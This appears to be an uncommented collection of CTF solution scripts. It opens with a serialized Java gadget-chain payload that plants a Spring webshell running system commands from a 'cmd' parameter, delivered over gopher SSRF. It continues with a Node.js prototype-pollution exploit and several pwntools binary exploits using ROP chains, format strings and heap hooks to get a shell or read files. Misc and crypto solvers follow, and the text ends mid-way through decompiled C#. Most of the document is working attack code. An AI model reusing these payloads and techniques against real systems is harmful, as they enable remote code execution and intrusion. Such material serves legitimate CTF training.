ldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwAxwDIAQASSW5qZWN0VG9Db250cm9sbGVyAQAPamF2YS9sYW5nL0NsYXNzDADJAMoBAEZvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uAQAQamF2YS9sYW5nL1N0cmluZwEABy95YW5nOTkMADkAywEATG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb24BADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZAwAOQDMAQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwwAOQDNDAA5AGAMAM4AzwEAQG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMMANAA0QwA0gDTAQADY21kBwC9DADUANUHAL4MANYA1wEAAAEAB29zLm5hbWUHANgMANkA1QwA2gDbAQADd2luDADcAN0BABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBAAdjbWQuZXhlAQACL2MBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwA3gDfBwDgDADhAOIMADkA4wEAAlxBDADkAOUMAOYA5wwA6ADbDADpADoHAL8MAOoAYAwA6wA6DADsAO0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAE2phdmEvaW8vUHJpbnRXcml0ZXIBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldEJlYW4BACUoTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBADsoW0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDspVgEB9ihMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhcmFtc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9IZWFkZXJzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL0NvbnN1bWVzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1Byb2R1Y2VzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RDb25kaXRpb247KVYBAA9yZWdpc3Rlck1hcHBpbmcBAG4oTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87TGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDspVgEACmdldFJlcXVlc3QBACkoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAC2dldFJlc3BvbnNlAQAqKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAAVjbG9zZQEABXdyaXRlAQAFZmx1c2gBAAlzZW5kRXJyb3IBAAQoSSlWACEACAA4AAAAAAAFAAEAOQA6AAIAOwAAAQUACQAIAAAAcSq3AAG4AAISAwO5AAQDAMAABUwrEga5AAcCAMAABk0SCBIJA70ACrYAC067AAxZBL0ADVkDEg5TtwAPOgS7ABBZA70AEbcAEjoFuwATWRkEGQUBAQEBAbcAFDoGuwAIWRIVtwAWOgcsGQYZBy22ABexAAAAAgA8AAAAKgAKAAAAGAAEABkAEwAbAB8AHQArAB8APQAhAEoAIwBcACUAZwAmAHAAJwA9AAAAUgAIAAAAcQA%2bAD8AAAATAF4AQABBAAEAHwBSAEIAQwACACsARgBEAEUAAwA9ADQARgBHAAQASgAnAEgASQAFAFwAFQBKAEsABgBnAAoATAA/AAcATQAAAAwABQBOAE8AUABRAFIAAQBTAFQAAwA7AAAAPwAAAAMAAAABsQAAAAIAPAAAAAYAAQAAACwAPQAAACAAAwAAAAEAPgA/AAAAAAABAFUAVgABAAAAAQBXAFgAAgBNAAAABAABAFkAWgAAAAkCAFUAAABXAAAAAQBTAFsAAwA7AAAASQAAAAQAAAABsQAAAAIAPAAAAAYAAQAAADEAPQAAACoABAAAAAEAPgA/AAAAAAABAFUAVgABAAAAAQBcAF0AAgAAAAEAXgBfAAMATQAAAAQAAQBZAFoAAAANAwBVAAAAXAAAAF4AAAABADkAYAACADsAAAA5AAEAAgAAAAUqtwABsQAAAAIAPAAAAAYAAQAAADQAPQAAABYAAgAAAAUAPgA/AAAAAAAFAGEAYgABAFoAAAAFAQBhAAAAAQBjADoAAgA7AAAB0wAGAAgAAADNuAACwAAYwAAYtgAZTLgAAsAAGMAAGLYAGk0rEhu5ABwCAE4suQAdAQA6BC3GAJMSHjoFEh%2b4ACC2ACESIrYAI5kAIbsAJFkGvQANWQMSJVNZBBImU1kFLVO3ACc6BqcAHrsAJFkGvQANWQMSKFNZBBIpU1kFLVO3ACc6BrsAKlkZBrYAK7YALLcALRIutgAvOgcZB7YAMJkACxkHtgAxpwAFGQU6BRkHtgAyGQQZBbYAMxkEtgA0GQS2ADWnAAwsEQGUuQA2AgCnAAROsQABABoAyADLADcAAwA8AAAATgATAAAAOQANADoAGgA%2bACMAPwArAEAALwBBADMAQwBDAEQAYQBGAHwASACSAEkApgBKAKsASwCyAEwAtwBNALwATgC/AFAAyABSAMwAUwA9AAAAXAAJAF4AAwBkAGUABgAzAIkAZgBiAAUAfABAAGQAZQAGAJIAKgBnAGgABwAjAKUAaQBiAAMAKwCdAGoAawAEAAAAzQA%2bAD8AAAANAMAAbABtAAEAGgCzAG4AbwACAHAAAAA2AAj/AGEABgcAcQcAcgcAcwcAdAcAdQcAdAAA/AAaBwB2/AAlBwB3QQcAdPgAGvkACEIHAHgAAE0AAAAEAAEAeQABAHoAAAACAHtwdAAEbmFtZXB3AQB4c3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ACVsAC2lQYXJhbVR5cGVzcQB%2bAAh4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAB0AA5uZXdUcmFuc2Zvcm1lcnVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh4
"""
#注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(test)
new = tmp.replace('%0A','%0D%0A')
result = '_'+new
print('gopher://192.168.7.23:
8080/'+result)
http://192.168.7.23:
8080/yang99?cmd=cat%2b/flag
username === adminUser.username && password === adminUser.password.substring(1,6)
"?admin?".substring(1,6)
//得到 uDE00admi
var user = {
        username: req.session.username,
        money: req.session.money
    };
let order = {};
    if(!order[user.username]) {
        order[user.username] = {};
    }

    Object.assign(order[user.username], product);
{"name": "/flag", "id": 2, "token": true}
TypeError [ERR_INVALID_ARG_TYPE]: The "path" argument must be of type string or an instance of Buffer or URL. Received an instance of Object
{
    "name":{
        "href": 'file:///fl%61g',
        "origin": 'null',
        "protocol": 'file:',
        "username": '',
        "password": '',
        "host": '',
        "hostname": '',
        "port": '',
        "pathname": '/fl%61g',
        "search": '',
        "searchParams": "URLSearchParams {}",
        "hash": ''
    },
    "id":2,
    "token":
true
}
import requests
session = requests.Session()

url = "http://localhost:
8000/" # 题目url

def login():
    data = {
        "username": "admin",
        "password": "uDE00admi"
    }
    session.post(url + "login", json = data)

def changeUsername():
    data = { "username": "__proto__" }
    session.post(url + "changeUsername", json = data)

def buyFlag():
    data = {
        "name":{
          "href": 'file:///fl%61g',
          "origin": 'null',
          "protocol": 'file:',
          "username": '',
          "password": '',
          "host": '',
          "hostname": '',
          "port": '',
          "pathname": '/fl%61g',
          "search": '',
          "searchParams": "URLSearchParams {}",
          "hash": ''
        },
        "id":2,
        "token":
True
    }
    res = session.post(url + "buy", json = data)
    return res.text

if __name__ == '__main__':
    login()
    changeUsername()
    flag = buyFlag()
    print(flag)
```plain
with open('what_is_it.piz', 'rb') as f:
    with open('flag.txt', 'w') as f1:
        f1.write(f.read(700000).hex().upper()[::-1])
```plain
from string import ascii_uppercase as uppercase
from itertools import cycle
import hashlib

table = dict()
for ch in uppercase:
    index = uppercase.index(ch)
    table[ch] = uppercase[index:] + uppercase[:
index]

deTable = {'A': 'A'}
start = 'Z'
for ch in uppercase[1:]:
    index = uppercase.index(ch)
    deTable[ch] = chr(ord(start) + 1 - index)

def deKey(key):
    return ''.join([deTable[i] for i in key])

def encrypt(plainText, key):
    result = []
    # 创建cycle对象，支持密钥字母的循环使用
    currentKey = cycle(key)
    for ch in plainText:
        if 'A' <= ch <= 'Z':
            index = uppercase.index(ch)
            # 获取密钥字母
            ck = next(currentKey)
            result.append(table[ck][index])
        else:
            result.append(ch)
    return ''.join(result)

key = "TREX"
keys = deKey(key)

def Pailie(list1, start, end):
    if start == end:
        q = "".join(list1)
        ans = encrypt(q, keys)
        # print(ans)
        flag = hashlib.md5(ans.encode()).hexdigest()
        if ("5613a" in flag[0:5]):
            print(flag)
    else:
        for i in range(start, end + 1):
            list1[start], list1[i] = list1[i], list1[start]
            Pailie(list1, start + 1, end)
            list1[start], list1[i] = list1[i], list1[start]

mw = ['H', 'Y', 'L', 'E', 'V', 'S', 'G', 'Q', 'Y']
Pailie(mw, 0, len(mw) - 1)
6e187bef
323d1a4b
f067ec94
tshark -r keyboard.pcapng -T fields -e usbhid.data > usbdata.txt
from PIL import Image
str = "4f5150514f00514f52515100514f525151004f50514f5150004f5151525052004f5150514f5250520051514f5250004f5151004f5151005151004f5151004f5151005151004f51504f5150004f5150514f5250520051514f5250004f5150514f525052004f5151004f5151525052004f5151505252004f5150514f004f51515052520051514f5250004f50514f5150004f515150525200514f525151004f51504f5150004f50514f5150004f5150514f525052004f5150514f525052004f50514f5150004f50514f5150005151004f5150514f004f5150514f525052004f51504f5150004f5151525052004f5151525052004f50514f51500051510051514f5250004f51504f5150004f5151505252004f5151525052004f5150514f5250520051514f5250004f5150514f00514f525151004f5150514f5250520051514f52500051510051514f5250004f5151004f5150514f525052004f5151525052005151004f50514f5150004f5151525052004f5151525052004f51515052520051514f5250004f5150514f525052004f5151505252004f515100514f525151004f51504f5150004f51515250520051514f525000514f525151004f5150514f525052004f5151505252004f51504f5150004f50514f5150004f5151525052004f5150514f525052004f51504f515000514f5251510051514f5250004f51504f515000514f525151005151004f5151505252004f5151004f5151505252004f51504f5150004f50514f5150004f51515052520051514f5250004f5150514f525052004f5150514f004f5150514f525052004f515152505200514f525151004f5150514f004f5150514f5250520051514f5250004f5151505252004f5151004f5151505252004f51515052520051514f525000514f525151004f51515052520051514f5250004f51504f5150004f515100"
img = Image.new('RGB', (len(str), len(str)))
i = 0
j = 5
print(len(str))
for n in range(len(str) // 2 -1):
    print(str[n*2:(n+1)*2])
    if str[n*2:(n+1)*2] == '4f':
        for k in range(6):
            i += 1
            img.putpixel((i, j), (255, 255,255 ))

    if str[n*2:(n+1)*2] == '51':
        for k in range(6):
            j += 1
            # r, g, b = img.getpixel((i, j))
            img.putpixel((i, j), (255, 255, 255))
    if str[n*2:(n+1)*2] == '50':
        for k in range(6):
            i -= 1
            # r, g, b = img.getpixel((i, j))
            img.putpixel((i, j), (255, 255, 255))
    if str[n*2:(n+1)*2] == '52':
        for k in range(6):
            j -= 1
            # r, g, b = img.getpixel((i, j))
            img.putpixel((i, j), (255, 255, 255))
    if str[n*2:(n+1)*2] == '00':
        j = 5
        i = i + 10
img.show()
2445986771771386879020650435885512839951630986248616789159906807439648035983463410703506828942860700640637
import binascii
from libnum import *
flag=2445986771771386879020650435885512839951630986248616789159906807439648035983463410703506828942860700640637
print(n2s(flag))
import libnum
f = open("keyboard.pcapng","rb").read()
pos = 1340
draws = ["622488","22","62426","624624","26822","642624","22684","622","62426848","622848"]
chars = ["0","1","2","3","4","5","6","7","8","9"]
c = ""
while(pos < len(f)):
 data = f[pos+57]
 if(data == 0x52):
 c += "8"
 elif(data == 0x51):
 c += "2"
 elif(data == 0x50):
 c += "4"
 elif(data == 0x4f):
 c += "6"
 elif(data == 0):
 c += " "
 pos += 0x80
c = c.split(" ")[:-1]
ans = ""
for i in c:
 ans += chars[draws.index(i)]
print(libnum.n2s(int(ans)))
mask0:(i+j) % 2
mask1:j % 2
mask2:i % 3
mask3:(i+j) % 3
mask4:(i//3+j//2)%2
mask5:(i*j)%3+(i*j)%2
mask6:((i*j)%3+i*j)%2
mask7:((i*j)%3+i+j)%2
mask8:(i*j) % 2
mask9:(i*j) % 3
mask10:(i^j) % 3
mask11:(i^j) % 2
mask12:(i//3+j//2)%3
mask13:(i^j)%3+(i^j)%2
mask14:((i^j)%3+i^j)%2
mask15:((i^j)%3+i+j)%2
import paho.mqtt.client as mqtt

client = mqtt.Client()
client.connect("127.0.0.1",1883,60)

data=''
for i in range(0x100):
    data+=chr(i)

client.publish('ctf/misc',data)
from Crypto.Util.number import *
import base64

f=open('data','rb')
data=f.read()

i=0
res=''
bin_pwd=''

while i<len(data):
    if data[i]<0x80:
        res+=chr(data[i])
        bin_pwd+='0'
        i+=1
    else:
        if data[i]==0xc2:
            res+=chr(data[i+1]&0x7f)
        else:
            res+=chr((data[i+1]+0x40)&0x7f)
        bin_pwd+='1'
        i+=2

f=open("flag.zip","wb")
    #print(res)
f.write(base64.b64decode(res))

bin_pwd=bin_pwd+'0'*(8-len(bin_pwd)%8)

print(long_to_bytes(int(bin_pwd,2)))
def exp():
   global r  
   global libc
   global elf
   r=remote("127.0.0.1",9999)
   ##r=process('./appetizer')
   libc=ELF('libc-2.31.so')
   elf=ELF('./appetizer')
   r.sendafter("Let's check your identity",'aaNameless');
   r.recvuntil('Here you are:')
   database=int(r.recvuntil('n',drop=True),16)-0x4050
   log.success('database:'+hex(database))
  
   ##set proc_func
   pop_rdi_ret=database+0x14d3
   ret=database+0x101a
   csu_start=database+0x14B0
   csu_end=database+0x14ca
   write_got=database+elf.got['write']
   read_got=database+elf.got['read']
   buf=database+0x4050
   leave_ret=database+0x13a3

   ##set ROP
   ROP=p64(ret)*10+p64(csu_end)+p64(0)+p64(1)+p64(1)+p64(write_got)+p64(0x8)+p64(write_got)+p64(csu_start)
   ROP+=p64(0)+p64(0)+p64(1)+p64(0)+p64(buf+0x108)+p64(0x105)+p64(read_got)+p64(csu_start)
   ROP+=p64(0)*7
   ##overflow
   print('test:'+hex(len(ROP)))
   r.sendafter("information on it",ROP)
   ##z()
   r.sendafter("Tell me your wish:n",p64(buf)+p64(leave_ret))
   sleep(1)
   libcbase=u64(r.recv(6).ljust(8,'x00'))-libc.sym['write']
   log.success("libcbase:"+hex(libcbase))
   ##one=[0xe6aee,0xe6af1,0xe6af4]
   ##onegadget=libcbase+one[0]
    
   ##set libc_func
   pop_rsi_ret=libcbase+0x27529
   pop_rdx_pop_rbx_ret=libcbase+0x1626d6
   open_addr=libcbase+libc.sym['open']
   read_addr=libcbase+libc.sym['read']
   puts_addr=libcbase+libc.sym['puts']
    
   flag_addr =buf + 0x108+0x100
   chain = flat(
   pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
   pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
   pop_rdi_ret , flag_addr , puts_addr
   ).ljust(0x100,'x00') + 'flagx00'
   r.send(chain)
   ##print('test:'+hex(len(ROP)))
   r.interactive()
    #encoding: utf-8
#!/usr/bin/python

from pwn import *
import sys
    #from LibcSearcher import LibcSearcher

context.log_level = 'debug'
context.arch='amd64'

local=0
binary_name='appetizer'
libc_name='libc-2.31.so'

libc=ELF("./"+libc_name)
elf=ELF("./"+binary_name)

if local:
    p=process("./"+binary_name)
    #p=process("./"+binary_name,env={"LD_PRELOAD":"./"+libc_name})
    #p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./"+binary_name])
    #p = process(argv=["./qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "-g", "1234", "./"+binary_name])
else:
    p=remote('node4.buuoj.cn',25846)

def z(a=''):
    if local:
        gdb.attach(p,a)
        if a=='':
            raw_input
    else:
        pass

ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda a,b:p.sendafter(a,b)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()

def leak_address():
    if(context.arch=='i386'):
        return u32(p.recv(4))
    else :
        return u64(p.recv(6).ljust(8,b'x00'))

# main

sa("Let's check your identityn",p64(0x7373656C656D614E).rjust(10,'x00')) #.ljust(16,'x00')
ru('Here you are:')
end_addr=int(p.recv(14),16)
elf_base=end_addr-0x4050
read_plt = elf_base+elf.plt['read']
write_plt = elf_base+elf.plt['write']
puts_got = elf_base+elf.got['puts']
leave_ret=elf_base+0x12d8
pop_rdi=elf_base+0x14d3
pop_rsi_r15=elf_base+0x14d1
ret=elf_base+0x101a
success("elf_base:"+hex(elf_base))

    #z('b *$rebase(0x146F)')
    #pause()

payload  = p64(pop_rdi)+p64(1)
payload += p64(pop_rsi_r15)+p64(puts_got)+p64(0)+p64(write_plt)
payload += p64(ret)*21+p64(elf_base+0x1428)
payload = payload.ljust(0xe0,"x00")+p64(end_addr-8)+p64(leave_ret)
payload = payload.ljust(0xf8,"x00")+b'./flagx00x00'

sa("And pls write your own information on itn",payload)

payload=p64(end_addr-8)+p64(leave_ret)
sa("Tell me your wish:n",payload)

puts_addr=leak_address()
libc_base=puts_addr-libc.sym['puts']
pop_rsi=libc_base+0x27529
pop_rdx_r12=libc_base+0x11c1e1
open_addr=libc_base+libc.sym['open']
success("libc_base:"+hex(libc_base))

orw  = p64(pop_rdi)+p64(end_addr+0xf8)
orw += p64(pop_rsi)+p64(0)+p64(open_addr)

orw += p64(pop_rdi)+p64(3)
orw += p64(pop_rsi)+p64(end_addr+0x100)
orw += p64(pop_rdx_r12)+p64(0x30)+p64(0)+p64(read_plt)

orw += p64(pop_rdi)+p64(end_addr+0x100)+p64(puts_addr)

p.send(orw)
p.send('yemei')

ia()
def exp():
   global r  
   global libc
   global elf
   r=remote("127.0.0.1",9999)
   ##r=process('./cyberprinter')
   libc=ELF('libc-2.31.so')
   ##z()
   r.sendafter("pls..",'a'*0x10+'Nameless')
   r.recvuntil('Nameless')
   libcbase=u64(r.recv(6).ljust(8,'x00'))-libc.sym['_IO_2_1_stderr_']
   log.success('libcbase:'+hex(libcbase))
    
   ##set_libc_func
   one=[0xe6aee,0xe6af1,0xe6af4]
   exit_hook=libcbase+0x1ed608
   ogg=libcbase+one[0]
   free_hook=libcbase+libc.sym['__free_hook']
    
   ##set_fmt_sth
   A=ogg & 0xffff
   B=(ogg>>16) & 0xffff
   C=0x1140

   pd='%{}c%22$hn%{}c%13$hn%{}c%14$hn'.format(C,A-C,B-A)
   pd=pd.ljust(0x28,'x00')+p64(exit_hook)+p64(exit_hook+2)+'aaaaaaaa'*7+'x18'
   ##z()
   r.sendafter("And I will print what you write",pd)
   r.sendafter("pls..",'a'*0x10+'Nameless')
   r.sendafter("And I will print what you write",'pPxX')
   r.interactive()
def z():
   gdb.attach(r)

def cho(num):
   r.sendlineafter("Your choice:",str(num))

def add(idx,con):
   cho(1)
   r.sendlineafter("Whisky , brandy or Vodka?",str(idx))
   r.sendafter("You may want to tell sth to the waiter:",con)

def free(idx,size=0x100):
   cho(2)
   r.sendlineafter("Which?",str(idx))
   r.sendlineafter("How much?",str(size))

def exp():
   global r  
   global libc
   global elf
   r=remote("127.0.0.1",9999)
   ##r=process('./bar')
   libc=ELF('libc-2.31.so')
   cho(3)
   r.recvuntil("icecream!n")
   libcbase=int(r.recvuntil('n',drop=True),16)-libc.sym['_IO_2_1_stdout_']
   log.success("libcbase:"+hex(libcbase))

   ##set_libc_func
   ##system=libcbase+libc.sym['system']
   one=[0xe6aee,0xe6af1,0xe6af4]
   onegadget=libcbase+one[1]
   for i in range(0,10):
       add(0,'nameless')
   for i in range(0,9):
       free(i)
   add(0,'nameless')#10
   ##z()
   free(8,0)
   add(1,'nameless')#11
   add(1,'nameless')#12
   add(2,'nameless')#13
   free(8,0x80)
   add(0,'nameless')#14
   add(0,p64(onegadget))
   add(0,'cat ')
   r.interactive()
    
if __name__ == '__main__':
   exp()
def z():
   gdb.attach(r)

def cho(num):
   r.sendlineafter("Your choice:",str(num))

def add(size,con):
   cho(1)
   r.sendlineafter("size:",str(size))
   r.sendafter("content:",con)

def change(idx,size,con):
   cho(2)
   r.sendlineafter("idx",str(idx))
   r.sendlineafter("size",str(size))
   r.sendafter("con",con)

def show(idx):
   cho(3)
   r.sendlineafter("idx",str(idx))

def exp():
   global r  
   global libc
   ##r=process('./cgrasstring')
   r=remote("127.0.0.1",9999)
   libc=ELF('libc-2.27.so')
   for i in range(0,8):
       add(0x80,"nameless")
   for i in range(1,8):
       change(i,0x90,'xe0')
   ##z()
   ##z()
   show(7)
   r.recvuntil('Now you see it:')
   libcbase=u64(r.recv(6).ljust(8,'x00'))-0x3ebce0
   log.success("libcbase:"+hex(libcbase))

   ##set_libcfunc
   ##exit_hook=libcbase+0x1ed608
   free_hook=libcbase+libc.sym['__free_hook']
   system=libcbase+libc.sym['system']
   add(0x20,'cat flag')
   change(8,0x30,p64(free_hook))
   one=[0x4f3d5,0x4f432,0x10a41c]
   ogg=libcbase+one[1]
    
   ##get_shell
   ##z()
   add(0x20,p64(ogg))
   ##z()
   ##cho(4)
   r.interactive()
    
if __name__ == '__main__':
   exp()
    #encoding: utf-8
#!/usr/bin/python

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'

local=0
binary_name='pwn'
libc_name='libc-2.31.so'

libc=ELF("./"+libc_name)
elf=ELF("./"+binary_name)

if local:
    #p=process("./"+binary_name)
    p=process("./"+binary_name,env={"LD_PRELOAD":"./"+libc_name})
    #p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./"+binary_name])
    #p = process(argv=["./qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "-g", "1234", "./"+binary_name])
else:
    p=remote('127.0.0.1',9999)

def z(a=''):
    if local:
        gdb.attach(p,a)
        if a=='':
            raw_input
    else:
        pass

ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda a,b:p.sendafter(a,b)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()

def leak_address():
    if(context.arch=='i386'):
        return u32(p.recv(4))
    else :
        return u64(p.recv(6).ljust(8,b'x00'))

def cho(num):
    sl(str(num))

def add(size,con):
    cho(1)
    sa('Note size:',str(size))
    sa('Note content:',con)

def show(idx):
    cho(3)
    sa("Note ID:",str(idx))

def delete(idx):
    cho(2)
    sa("Note ID:",str(idx))

# variables

# gadgets

# helper functions

op32 = make_packer(32, endian='big', sign='unsigned') # opposite p32
op64 = make_packer(64, endian='big', sign='unsigned') # opposite p64

# main

add(0x80,'yemei0')  # 0
add(0x80,'yemei1')  # 1
add(0x200,'yemei2') # 2
add(0x200,'yemei3') # 3
add(0x80,'yemei4')  # 4

delete(0)

# 堆溢出覆盖改size
payload='A'*0x80+p64(0)+p64(0x4B1)
add(0x100000080,payload) # 0
delete(1)

# 切割unsorted bin堆块，使头结点落在#2堆块的con位
add(0x80,'yemei1') # 1
show(2)

ru('Note content:')
unsorted_addr=leak_address()
libc_base=unsorted_addr-0x1ebbe0
system_addr=libc_base+libc.sym['system']
__free_hook=libc_base+libc.sym['__free_hook']
success("unsorted_addr:"+hex(unsorted_addr))
success("libc_base:"+hex(libc_base))

    #z('set $a=$rebase(0x4060)')
    #pause()

add(0x400,'yemei5') # 5

delete(1)
payload='A'*0x80+p64(0)+p64(0x211)
add(0x100000080,payload) # 1

delete(3)
delete(2)

# 劫持tache头结点，改__free_hook为system
delete(1)
payload='A'*0x80+p64(0)+p64(0x211)+p64(__free_hook)
add(0x100000080,payload)    # 1

add(0x200,'/bin/shx00')    # 2
add(0x200,p64(system_addr)) # 3

delete(2)

ia()
import base64

endata='GUwDUHG#kYGx7FBA#{QJT(A {BG$BG$BGz//'
b64data=[]
for i in range(len(endata)):
    temp = ord(endata[i])^0x12
    b64data.append(temp)
       
for i in range(len(endata)-2):
    b64data[i]=chr(b64data[i]-1)
   
enflag = bytearray(base64.b64decode(''.join(b64data)))
      
flag=''
for i in range(len(enflag)):
    flag+=chr((enflag[i]-1)^0x22)
    print(flag)
      
    #itisbulijojodebuliduoooooooo
// ᜂ
// Token: 0x0600001E RID: 30 RVA: 0x00002594 File Offset: 0x00000794
private object ᜀ(ref string[] A_0, string A_1)
{
 int a_ = 1;
 checked
 {
 switch (0)
 {
 default:
 {
 object result;
 for (;;)
 {
 string text = ᜀ.b("഼䴾⁀㩂㙄", a_);
 int num = 0;
 int num2 = A_1.Length - 2;
 int num3 = 6;
 if (true)
 {
 }
 int num4 = 4;
 for (;;)
 {
 switch (num4)
 {
 case 0:
 return result;
 case 1:
 goto IL_67;
